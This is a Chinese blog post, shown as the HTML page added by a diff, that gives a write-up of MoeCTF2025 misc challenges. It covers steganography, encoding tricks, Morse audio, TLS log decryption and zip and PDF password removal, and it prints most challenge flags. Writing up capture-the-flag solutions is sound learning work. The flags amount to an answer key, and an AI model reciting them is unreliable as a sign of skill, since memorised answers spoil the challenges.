@@ -1,0 +1,826 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 8.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"cxyadvancer.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="前言   依旧在西电ctf刷题 misc2048_master附件给了一个2028游戏，跑了一遍直接多了一个bat文件，打开对应的就是游戏里每个数字的大小，2的n次方，题目说到16384就可以得到flag，直接在dat文件修改14，然后运行游戏玩一会就得到flag   moectf{Y0u_4re_a_2048_m4st3r!!!!r0erowhu} Misc入门指北这里直接搜索moectf{,就">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MoeCTF2025-WEB-MISC">
+<meta property="og:url" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/index.html">
+<meta property="og:site_name" content="程序元的blog">
+<meta property="og:description" content="前言   依旧在西电ctf刷题 misc2048_master附件给了一个2028游戏，跑了一遍直接多了一个bat文件，打开对应的就是游戏里每个数字的大小，2的n次方，题目说到16384就可以得到flag，直接在dat文件修改14，然后运行游戏玩一会就得到flag   moectf{Y0u_4re_a_2048_m4st3r!!!!r0erowhu} Misc入门指北这里直接搜索moectf{,就">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260123192741250.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260123192806947.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260123192915301.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260123193528475.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260123195526296.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260123200439043.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260123200514541.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260123202840672.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260123203916976.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260123214326330.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260123211604637.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260123211714450.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260123212819135.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260123213159816.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260123213813399.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124100103426.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124101025775.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/upload.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/bf051bdcbc9648a89d5ae719ef5beaf9.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124105537942.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124105947721.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124110602581.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124110748993.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/1758445066636-85f3c337-e2c2-44ea-8fc8-f69b393d87f5.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/1758528543740-da1ce27d-6e23-46ed-a920-923a1d5e7256.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124111549321.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124114639840.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124111948002.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124114814625.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124120157130.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124120458994.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124122226527.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124122818260.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124122909644.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124123034805.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124124159843.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124130056520.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124124433954.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124124936129.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124130641622.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124130758324.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124190949929.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124192226655.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124190918500.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124193018258.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/00002048.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124195303683.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124195704316.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124200551026.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124200907092.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124201127213.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124201645717.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124202518395.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124203534008.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124204630309.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124205404679.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126112003658.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126115242468.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126115542589.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126115724418.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126122111010.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126122156489.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126122756900.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126123425252.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126132050894.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126132212402.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126144533157.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126151504265.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126173147294.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126180822727.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126181011847.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260127185925933.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260127190326884.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126214925848.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126215217474.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126215521068.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126215757592.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126220915606.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126220955381.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126221023105.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260126221256431.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260127104649539.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260127112842494.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260127165943253.png">
+<meta property="og:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260127170235698.png">
+<meta property="article:published_time" content="2026-01-23T10:24:59.000Z">
+<meta property="article:modified_time" content="2026-01-27T11:14:40.828Z">
+<meta property="article:author" content="程序元">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/image-20260123192741250.png">
+
+<link rel="canonical" href="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>MoeCTF2025-WEB-MISC | 程序元的blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">程序元的blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://cxyadvancer.github.io/2026/01/23/MoeCTF2025-WEB-MISC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="程序元">
+      <meta itemprop="description" content="路漫漫其修远兮，吾将上下而求索。">
+    </span>
+    
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="程序元的blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          MoeCTF2025-WEB-MISC
+        </h1>
+    
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+    
+              <time title="创建时间：2026-01-23 18:24:59" itemprop="dateCreated datePublished" datetime="2026-01-23T18:24:59+08:00">2026-01-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-01-27 19:14:40" itemprop="dateModified" datetime="2026-01-27T19:14:40+08:00">2026-01-27</time>
+              </span>
+    
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+             <span></span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>undefined 分钟</span>
+            </span>
+    
+        </div>
+      </header>
+    
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+    
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>   依旧在西电ctf刷题</p>
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="2048-master"><a href="#2048-master" class="headerlink" title="2048_master"></a><strong>2048_master</strong></h2><p>附件给了一个2028游戏，跑了一遍直接多了一个bat文件，打开对应的就是游戏里每个数字的大小，2的n次方，题目说到16384就可以得到flag，直接在dat文件修改14，然后运行游戏玩一会就得到flag</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260123192741250.png" alt="image-20260123192741250"></p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260123192806947.png" alt="image-20260123192806947"></p>
+<p>moectf{Y0u_4re_a_2048_m4st3r!!!!r0erowhu}</p>
+<h2 id="Misc入门指北"><a href="#Misc入门指北" class="headerlink" title="Misc入门指北"></a><strong>Misc入门指北</strong></h2><p>这里直接搜索moectf{,就可以直接搜索到</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260123192915301.png" alt="image-20260123192915301"></p>
+<p>虽然看不到但是可以直接复制</p>
+<p>moectf{We1c0m3_7o_tH3_w0R1d_0f_m1sc3111aN3ous!!}</p>
+<h2 id="Rush"><a href="#Rush" class="headerlink" title="Rush"></a><strong>Rush</strong></h2><p>附件是一个gif，直接看有一帧是有二维码的</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260123193528475.png" alt="image-20260123193528475"></p>
+<p>但是二维码并不完全，这里用点手段补一下就行了，</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260123195526296.png" alt="image-20260123195526296"></p>
+<p>这样就能扫出来了</p>
+<h2 id="ez-LSB"><a href="#ez-LSB" class="headerlink" title="ez_LSB"></a><strong>ez_LSB</strong></h2><p>题目提示这么明显了就是lab</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260123200439043.png" alt="image-20260123200439043"></p>
+<p>base64解码得到flag</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260123200514541.png" alt="image-20260123200514541"></p>
+<p>moectf{LSB_1s_s0_1nt3rest1ng!!sj9wd}</p>
+<h2 id="ez-锟斤拷"><a href="#ez-锟斤拷" class="headerlink" title="ez_锟斤拷????"></a><strong>ez_锟斤拷????</strong></h2><p>搜了搜锟斤拷的来源就是当UTF-8的多字节序列被错误地用GBK解码时，这些特定的字节组合正好对应了「锟斤拷」这三个汉字。虽然附件不只有这三个，但原理应该差不多。exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">乱码 = &quot;锝嶏綇锝咃絻锝旓絾锝涳讥锝庯迹锛愶絼锛戯綁锝庯絿锛匡絿锝傦极锛匡紶锝庯激锛匡嫉锝旓絾锛匡紭锛匡紤锝擄伎锛旓綍锝庯紒锛侊絽锝楋綏锝楋綏锝濇伃鍠滀綘寰楀埌寮楁媺鏍煎悗闈㈠叏鏄敓鏂ゆ嫹閿熸枻鎷烽敓鏂ゆ嫹&quot;</span><br><span class="line"></span><br><span class="line">flag = 乱码.encode(&quot;gb18030&quot;).decode(&quot;utf-8&quot;, errors=&quot;replace&quot;)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260123202840672.png" alt="image-20260123202840672"></p>
+<p>moectf{EnC0d1ing_gbK_@nD_Utf_8_1s_4un!!ewwww}</p>
+<h2 id="weird-photo"><a href="#weird-photo" class="headerlink" title="weird_photo"></a><strong>weird_photo</strong></h2><p>宽高隐写，随波逐流一把梭</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260123203916976.png" alt="image-20260123203916976"></p>
+<h2 id="SSTV"><a href="#SSTV" class="headerlink" title="SSTV"></a><strong>SSTV</strong></h2><p>考察sstv</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260123214326330.png" alt="image-20260123214326330"></p>
+<p>moectf{d3codiNG_SStV_reQu1REs-PATI3nC3}</p>
+<h2 id="encrypted-pdf"><a href="#encrypted-pdf" class="headerlink" title="encrypted_pdf"></a><strong>encrypted_pdf</strong></h2><p><a target="_blank" rel="noopener" href="https://www.ilovepdf.com/zh-cn/unlock_pdf">解锁 PDF文件。删除PDF文件的保护密码。</a>直接删除密码进入，然后直接搜关键字</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260123211604637.png" alt="image-20260123211604637"></p>
+<p>这个图片挡住flag了，把图片删了</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260123211714450.png" alt="image-20260123211714450"></p>
+<h2 id="哈基米难没露躲"><a href="#哈基米难没露躲" class="headerlink" title="哈基米难没露躲"></a><strong>哈基米难没露躲</strong></h2><p>这个随波逐流分析附件</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260123212819135.png" alt="image-20260123212819135"></p>
+<p>在最后有一个网址，哈吉米翻译器这一题太有意思了，以前遇到过东北方言的编程语言，这次是哈吉米，把附件翻译过来就是</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260123213159816.png" alt="image-20260123213159816"></p>
+<p>提示文本隐写，考虑零宽隐写</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260123213813399.png" alt="image-20260123213813399"></p>
+<p>moectf{1b8956b9-a423-4101-a1bd-65be33682c82}</p>
+<h2 id="捂住一只耳"><a href="#捂住一只耳" class="headerlink" title="捂住一只耳"></a><strong>捂住一只耳</strong></h2><p>题目名称就是提示，用audacity打开音频，分离出两个声道，下面的是摩斯密码</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124100103426.png" alt="image-20260124100103426"></p>
+<p>摩斯密码就是..-. .-.. .- –. .. … —… …. .- .-.. ..-. ..–.- .-. .- -.. .. — ..–.- .. -. ..–.- -..- -.. ..-</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124101025775.png" alt="image-20260124101025775"></p>
+<p>moectf{HALF_RADIO_IN_XDU}</p>
+<h2 id="Enchantment"><a href="#Enchantment" class="headerlink" title="Enchantment"></a><strong>Enchantment</strong></h2><p>分析流量包得只上传一个图片，导出文件</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/upload.png" alt="upload"></p>
+<p>根据题目描述应该从是附魔台的文字下手，搜索资料得到是标准银河字母，一一对照</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/bf051bdcbc9648a89d5ae719ef5beaf9.png" alt="准银河字母、当铺密码、摩斯电码详解-CSDN博客"></p>
+<p>moectf{now_you_have_mastered_enchanting}s</p>
+<h2 id="MoeCTF指导版"><a href="#MoeCTF指导版" class="headerlink" title="MoeCTF指导版"></a><strong>MoeCTF指导版</strong></h2><p>我真服了这道题了，这个耋耄坏得很，首先根据提示一步一步走，喂它小鱼干，到25个之后就不能再喂了，点flag，有三个题目</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124105537942.png" alt="image-20260124105537942"></p>
+<p>一共有24个题目</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124105947721.png" alt="image-20260124105947721"></p>
+<p>这考察的有点难评，在9月1日记录两个成绩</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124110602581.png" alt="image-20260124110602581"></p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124110748993.png" alt="image-20260124110748993"></p>
+<p>最后应该是13930</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/1758445066636-85f3c337-e2c2-44ea-8fc8-f69b393d87f5.png" alt="img"></p>
+<p>点一下就知道了是73</p>
+<p>最后是241393073，校验后还是不对看wp才知道有个提示</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/1758528543740-da1ce27d-6e23-46ed-a920-923a1d5e7256.png" alt="img"></p>
+<p>赛后题目没有这个提示，修改后就是241410173，再次校验，虽然说还不对但是可以校验</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124111549321.png" alt="image-20260124111549321"></p>
+<p>   然后最后一个问题不一样是说他说的话有多少个字，</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124114639840.png" alt="image-20260124114639840">真无语了答案是14+28+14&#x3D;56，最后的账号是241410156</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124111948002.png" alt="image-20260124111948002"></p>
+<p>输入password</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124114814625.png" alt="image-20260124114814625"></p>
+<p>然后是incorrect!注意要加感叹号，然后就找回密码，那个字看不清，但是全选可以看到有文字xbhiuebkjvs，找回密码</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124120157130.png" alt="image-20260124120157130"></p>
+<p>密码是六个*，然后分析前端代码，是要进入镜像模式才能获得flag，设置-&gt;左右镜像反转-&gt;flag-&gt;左右镜像反转获得flag</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124120458994.png" alt="image-20260124120458994"></p>
+<p>这是无语了</p>
+<h2 id="WebRepo"><a href="#WebRepo" class="headerlink" title="WebRepo"></a><strong>WebRepo</strong></h2><p>扫描二维码得到内容：Flag is not here, but I can give you a hint: Use binwalk.binwalk提取出来一个git文件</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124122226527.png" alt="image-20260124122226527"></p>
+<h2 id="ez-ssl"><a href="#ez-ssl" class="headerlink" title="ez_ssl"></a><strong>ez_ssl</strong></h2><p>主要考察tls流量解密，题目说上传了一个文件</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124122818260.png" alt="image-20260124122818260"></p>
+<p>就是这个sss.log，新建一个sss.log</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124122909644.png" alt="image-20260124122909644"></p>
+<p>导入解密然后看解密流量</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124123034805.png" alt="image-20260124123034805"></p>
+<p>这里上传了一个压缩包，导出发现需要密码</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124124159843.png" alt="image-20260124124159843"></p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124130056520.png" alt="image-20260124130056520"></p>
+<p>爆破密码是6921682，解压得到附件是OOK编码，解码</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124124433954.png" alt="image-20260124124433954"></p>
+<h2 id="ez-png"><a href="#ez-png" class="headerlink" title="ez_png"></a><strong>ez_png</strong></h2><p>这一题没啥说的，binwalk提取然后得到flag</p>
+<p><img src="/2026/01/23/MoeCTF2025-WEB-MISC/image-20260124124936129.png" alt="image-20260124124936129"></p>
+<p>moectf{h1DdEn_P4YlOaD_IN-Id4T}</p>
